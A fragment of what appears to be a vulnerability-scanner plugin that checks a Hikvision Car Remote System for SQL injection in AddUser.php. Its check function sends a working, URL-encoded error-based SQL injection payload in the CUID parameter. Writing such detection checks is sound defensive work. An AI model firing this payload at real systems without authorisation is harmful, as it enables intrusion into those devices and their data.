...
if (description)
{
  script_version("1.3");
  script_id(51799108);
  script_name(english:"Hikvision Car Remote System AddUser.php-SQL Injection");
  script_summary(english:"Hikvision Car Remote System AddUser.php-SQL Injection");
...
function check_vuln(port){
	url = string("/AddUser.php?ManageAdd=1&AddUser=2&AreaID=1&CUID=1%20AND%20(SELECT%207874%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20(ELT(7874=7874,1))),MD5(10086),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)");
